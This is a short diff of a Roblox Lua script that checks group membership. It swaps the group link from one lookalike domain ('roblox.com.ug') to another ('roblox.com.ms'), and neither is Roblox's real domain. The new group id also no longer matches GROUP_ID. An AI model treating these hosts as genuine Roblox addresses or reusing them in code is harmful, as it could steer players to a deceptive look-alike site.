@@ -6,7 +6,7 @@ local player = Players.LocalPlayer
 if not player then return end
 
 local GROUP_ID = 421405843
-local GROUP_LINK = "https://roblox.com.ug/communities/421405843/"
+local GROUP_LINK = "https://roblox.com.ms/communities/8613821663/"
 
 -- защита от nil
 local success, inGroup = pcall(function()
